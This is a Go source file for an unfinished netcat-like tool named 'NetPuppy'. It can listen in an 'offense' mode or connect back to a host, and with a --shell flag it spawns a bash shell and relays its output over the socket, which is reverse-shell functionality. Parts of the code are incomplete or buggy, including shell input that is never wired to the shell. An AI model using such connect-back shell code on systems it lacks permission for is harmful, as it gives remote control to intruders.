/* TP U ARE HERE:
- re-organize the channels given new cb shell
- decide if the shell should be an option vs automatic
*/

package main

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"os/signal"
	"time"

	// NetPuppy modules:
	"netpuppy/utils"
)

func readUserInput(ioReader chan<- string) {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print(">> ")
		text, _ := reader.ReadString('\n')
		if len(text) > 0 {
			ioReader <- text
		}
	}
}

func readFromUserShell(shellUserChannel chan<- string, shellProcess utils.BashShell) {
	/*
		Depending on if the shell process is true on the peer struct
		we have 3 go routines. 2 for if the shell is true (readStdout, readStderr)
		and one if it's false (readUserInput)

		The go routines put data they get from their sources into the channel.
	*/

	readForStdout := func(stdout io.ReadCloser, shellUserChannel chan<- string) {
		// For loop checks for data in shell. stdout
		for {
			outData, err := io.ReadAll(stdout)
			if err != nil {
				fmt.Printf("Error reading data from stdout pipe: %v\n", err)
				os.Stderr.WriteString(err.Error() + "\n")
				os.Exit(1)
			}
			// If data: change to string and put in channel:
			cData := fmt.Sprintf("%v", outData)
			shellUserChannel <- cData
		}
		// Wait? Return?
	}

	readForStderr := func(stderr io.ReadCloser, shellUserChannel chan<- string) string {
		for {
			errData, err := io.ReadAll(stderr)
			if err != nil {
				fmt.Printf("Error reading data from stdout pipe: %v\n", err)
				os.Stderr.WriteString(err.Error() + "\n")
				os.Exit(1)
			}
			// If data: change to string and put in channel:
			cData := fmt.Sprintf("%v", errData)
			shellUserChannel <- cData
		}
		// Wait? Return?
	}

	readForUSerInput := func(reader *bufio.Reader, shellUserChannel chan<- string) {
		for {
			fmt.Print(">> ")
			text, _ := reader.ReadString('\n')
			if len(text) > 0 {
				shellUserChannel <- text
			}
		}
	}

	// HEY if this fuckx up, remember that we';ve already started the sehll (also pointers?)
	if shellProcess != nil { // We are the connect-back peer and --shell was given
		// Whatever is in the channel, write it to stdin of the shell:
		stdout, err := shellProcess.PipeStdout()
		if err != nil {
			fmt.Printf("Error getting stdout pipe from shell: %v\n", err)
			os.Stderr.WriteString(err.Error() + "\n")
			os.Exit(1)
		}

		stderr, err := shellProcess.PipeStderr()
		if err != nil {
			fmt.Printf("Error getting stderr pipe from shell: %v\n", err)
			os.Stderr.WriteString(err.Error() + "\n")
			os.Exit(1)
		}

		// Start separate go routines for capturing data from the shell:
		go readForStderr(stderr, shellUserChannel)
		go readForStdout(stdout, shellUserChannel)

		// If the command (bash shell exits), Wait will close the pipe:
		// WAIT

	} else { // if shellProcess is nil, then just get input from user:
		reader := bufio.NewReader(os.Stdin)
		go readForUSerInput(reader, shellUserChannel)
	}
}

func readFromSocket(socketChannel chan<- []byte, connection utils.Socket) {
	// Read from connection socket:
	for {
		// dataBytes, err := bufio.NewReader(connection).ReadBytes('\n')
		dataBytes, err := connection.Read()
		if err != nil {
			fmt.Printf("Error reading from socket: %v\n", err)
			os.Stderr.WriteString(err.Error())
			os.Exit(1)
			return
		}
		//socketReader <- dataBytes
		socketChannel <- dataBytes
	}
}

func runApp(c utils.ConnectionGetter) {
	// Parse flags from user, attach to struct:
	flagStruct := utils.GetFlags()

	// Print banner:
	fmt.Printf("%s", utils.Banner())

	// Create peer instance based on user input:
	var socket utils.Socket
	var thisPeer *utils.Peer = utils.CreatePeer(flagStruct.Port, flagStruct.Host, flagStruct.Listen, flagStruct.Shell)

	// Update user:
	var updateUserBanner string = utils.UserSelectionBanner(thisPeer.ConnectionType, thisPeer.Address, thisPeer.RPort, thisPeer.LPort)
	fmt.Println(updateUserBanner)

	// Make connection:
	if thisPeer.ConnectionType == "offense" {
		socket = c.GetConnectionFromListener(thisPeer.LPort, thisPeer.Address)
	} else {
		socket = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address)
	}

	// Connect socket connection to peer
	thisPeer.Connection = socket

	var shell utils.BashShell
	// If shell flag is true, start shell:
	if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
		var realShellGetter utils.RealShellGetter
		fmt.Printf("This peer shell: %v\n", thisPeer.Shell)

		shell = realShellGetter.GetConnectBackInitiatedShell(thisPeer)

		// Connect shell to peer:
		thisPeer.ShellProcess = shell

		// Start shell:
		err := thisPeer.ShellProcess.StartShell()
		if err != nil {
			fmt.Printf("Error when starting shell: %v\n", err)
		}
	}

	// Update banner w/ missing port:
	// var missingPortInBanner = utils.PrintMissingPortToBanner(thisPeer.ConnectionType, thisPeer.Connection)
	// fmt.Println(missingPortInBanner)

	// Start SIGINT go routine:
	// Start channel to listen for SIGINT:
	listenForSIGINT(thisPeer)

	// Start go routines and channels to read socket and user input:
	// IO read & socket write channels (user input will be written to socket)
	//	ioReader := make(chan string)

	// IO write & socket read channels (messages from socket will be printed to stdout)
	//socketReader := make(chan []byte)

	//	go readUserInput(ioReader)
	//	go readFromSocket(socketReader, thisPeer.Connection)

	socketChannel := make(chan []byte)
	shellUserChannel := make(chan string)

	/*
		threads we need:
			- read from socket
			-

			- read from user/shell
			- print to user/shell
	*/

	go readFromSocket(socketChannel, thisPeer.Connection)

	if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
		readFromUserShell(shellUserChannel, thisPeer.ShellProcess)
	} else {
		// do we need to send nil?
		readFromUserShell(shellUserChannel, nil)
	}

	for {
		select {
		case socketBoundInput := <-shellUserChannel:
			fmt.Printf("ioReader: %v\n", socketBoundInput)
			// Reads shellUserChannel and writes the data to the socket:
			_, err := thisPeer.Connection.Write([]byte(socketBoundInput))

			if err != nil {
				// Quit here?
				fmt.Printf("Error in userInput select: %v\n", err)
				os.Stderr.WriteString(" " + err.Error() + "\n")
			}
		case socketIncoming := <-socketChannel:
			//fmt.Printf("socketReader: %v", string(socketIncoming))
			// If we have a cb shell, data received from socket should be sent to shell stdin
			if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
				fmt.Printf("socketChannel: %v", string(socketIncoming))
			} else {
				_, err := os.Stdout.Write(socketIncoming)
				if err != nil {
					// Quit here?
					fmt.Printf("Error in writing to stdout: %v\n", err)
					os.Stderr.WriteString(" " + err.Error() + "\n")
				}
			}
		default:
			time.Sleep(300 * time.Millisecond)
		}
	}
}

func listenForSIGINT(thisPeer *utils.Peer) {
	// If SIGINT: close connection, exit w/ code 2
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	go func() {
		for sig := range signalChan {
			if sig.String() == "interrupt" {
				fmt.Printf("signal: %v\n", sig)
				thisPeer.Connection.Close()
				os.Exit(2)
			}
		}
	}()
}

func main() {
	// In order to test the connection code w/o creating REAL sockets, runApp() handles most of the logic:
	var realConnection utils.RealConnectionGetter
	runApp(realConnection)
}
